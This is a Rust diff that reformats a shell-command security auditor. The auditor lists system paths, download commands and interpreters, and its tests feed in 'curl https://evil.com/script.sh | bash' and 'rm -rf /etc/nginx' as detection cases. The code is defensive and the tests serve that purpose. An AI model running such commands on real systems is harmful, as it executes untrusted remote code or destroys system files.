@@ -39,13 +39,13 @@ pub struct ParsedShell {
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum ShellOperator {
-    Pipe,          // |
-    And,           // &&
-    Or,            // ||
-    Semicolon,     // ;
-    Redirect,      // >, >>, <, 2>
-    Subshell,      // $(...)
-    Backtick,      // `...`
+    Pipe,      // |
+    And,       // &&
+    Or,        // ||
+    Semicolon, // ;
+    Redirect,  // >, >>, <, 2>
+    Subshell,  // $(...)
+    Backtick,  // `...`
 }
 
 /// Security warnings detected by shell auditing.
@@ -270,17 +270,32 @@ fn tokenize(input: &str) -> Vec<String> {
 
 /// List of paths considered system-critical.
 const SYSTEM_PATHS: &[&str] = &[
-    "/etc", "/boot", "/sys", "/proc", "/dev", "/root",
-    "/System", "/Library", "C:\\Windows", "C:\\Program Files",
-    "C:\\Program Files (x86)", "/usr/lib", "/usr/bin", "/bin", "/sbin",
-    "~/.ssh", "~/.gnupg",
+    "/etc",
+    "/boot",
+    "/sys",
+    "/proc",
+    "/dev",
+    "/root",
+    "/System",
+    "/Library",
+    "C:\\Windows",
+    "C:\\Program Files",
+    "C:\\Program Files (x86)",
+    "/usr/lib",
+    "/usr/bin",
+    "/bin",
+    "/sbin",
+    "~/.ssh",
+    "~/.gnupg",
 ];
 
 /// Commands that download content from the network.
 const DOWNLOAD_COMMANDS: &[&str] = &["curl", "wget", "fetch", "axel"];
 
 /// Commands that execute arbitrary code or act as interpreters.
-const SHELL_COMMANDS: &[&str] = &["bash", "sh", "zsh", "fish", "dash", "python", "perl", "ruby", "node"];
+const SHELL_COMMANDS: &[&str] = &[
+    "bash", "sh", "zsh", "fish", "dash", "python", "perl", "ruby", "node",
+];
 
 /// Audit a parsed shell for security warnings.
 pub fn audit_shell(parsed: &ParsedShell) -> Vec<SecurityWarning> {
@@ -305,7 +320,8 @@ pub fn audit_shell(parsed: &ParsedShell) -> Vec<SecurityWarning> {
         // Check: recursive delete targeting system paths
         if cmd_lower == "rm" {
             let args_str = cmd.args.join(" ");
-            let is_recursive = args_str.contains("-r") || args_str.contains("-rf") || args_str.contains("-fr");
+            let is_recursive =
+                args_str.contains("-r") || args_str.contains("-rf") || args_str.contains("-fr");
             let targets_sys = cmd.args.iter().any(|a| is_system_path(a));
 
             if is_recursive && targets_sys {
@@ -314,9 +330,7 @@ pub fn audit_shell(parsed: &ParsedShell) -> Vec<SecurityWarning> {
         }
 
         // Check: writing to system paths via redirect
-        if ["sudo", "chmod", "chown", "mkdir", "touch", "dd"]
-            .contains(&cmd_lower.as_str())
-        {
+        if ["sudo", "chmod", "chown", "mkdir", "touch", "dd"].contains(&cmd_lower.as_str()) {
             let targets_sys = cmd.args.iter().any(|a| is_system_path(a));
             if targets_sys {
                 if cmd_lower == "chmod" {
@@ -382,14 +396,18 @@ mod tests {
     fn detect_download_pipe_to_shell() {
         let parsed = parse_shell("curl https://evil.com/script.sh | bash").unwrap();
         let warnings = audit_shell(&parsed);
-        assert!(warnings.iter().any(|w| matches!(w, SecurityWarning::PipeDownloadToShell)));
+        assert!(warnings
+            .iter()
+            .any(|w| matches!(w, SecurityWarning::PipeDownloadToShell)));
     }
 
     #[test]
     fn detect_dangerous_rm() {
         let parsed = parse_shell("rm -rf /etc/nginx").unwrap();
         let warnings = audit_shell(&parsed);
-        assert!(warnings.iter().any(|w| matches!(w, SecurityWarning::DangerousRm)));
+        assert!(warnings
+            .iter()
+            .any(|w| matches!(w, SecurityWarning::DangerousRm)));
     }
 
     #[test]
@@ -418,6 +436,8 @@ mod tests {
     fn detect_sudo_execution() {
         let parsed = parse_shell("sudo apt update").unwrap();
         let warnings = audit_shell(&parsed);
-        assert!(warnings.iter().any(|w| matches!(w, SecurityWarning::SudoExecution)));
+        assert!(warnings
+            .iter()
+            .any(|w| matches!(w, SecurityWarning::SudoExecution)));
     }
 }
